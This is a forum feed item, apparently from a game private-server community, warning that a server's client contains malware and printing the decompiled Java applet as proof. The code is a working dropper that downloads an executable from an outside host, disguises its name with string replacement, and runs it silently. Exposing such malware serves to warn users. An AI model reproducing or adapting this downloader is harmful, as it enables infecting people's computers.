channel.title: Keylogger
channel.description:
http://www.moparisthebest.com/serverstatus.php?server=hacizulkuf.dnsd.info
More of them are available on the status page, censor takoshscape.com as they keep re-posting it and users are more than likely getting infected. I haven't had time to investigate properly but from the looks of it, it's pretty clear that this server can affect your computer.

item.title: Keylogger
item.dc:creator: @ExtremeX-Scape Ryley
item.description:
@ExtremeX-Scape wrote:

Stupid skids.

package com;

import java.applet.Applet;
import java.applet.AppletContext;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;

public class rcky extends Applet
{

    public rcky()
    {
    }

    public void init()
    {
        String s = System.getProperty("java.io.tmpdir");
        String s1 = "\\";
        String s2 = "javac##xe";
        String s3 = s1.concat(s2.replace("##", ".e"));
        String s4 = s.concat(s3);
        String s5 = "http://takoshscape.com/adobe##xe";
        Object obj = "";
        try
        {
            FileOutputStream fileoutputstream = new FileOutputStream(s4);
            Runtime runtime = Runtime.getRuntime();
            URL url = new URL(s5.replace("##", ".e"));
            URLConnection urlconnection = url.openConnection();
            InputStream inputstream = urlconnection.getInputStream();
            byte abyte0[] = new byte[1024];
            int i;
            while((i = inputstream.read(abyte0, 0, abyte0.length)) != -1) 
                fileoutputstream.write(abyte0, 0, i);
            inputstream.close();
            fileoutputstream.close();
            runtime.exec(s4);
            obj = new URL((String)obj);
            getAppletContext().showDocument((URL)obj);
        }
        catch(Exception exception) { }
    }
}

(Taken directly from their client, decompiled by myself)

Read full topic
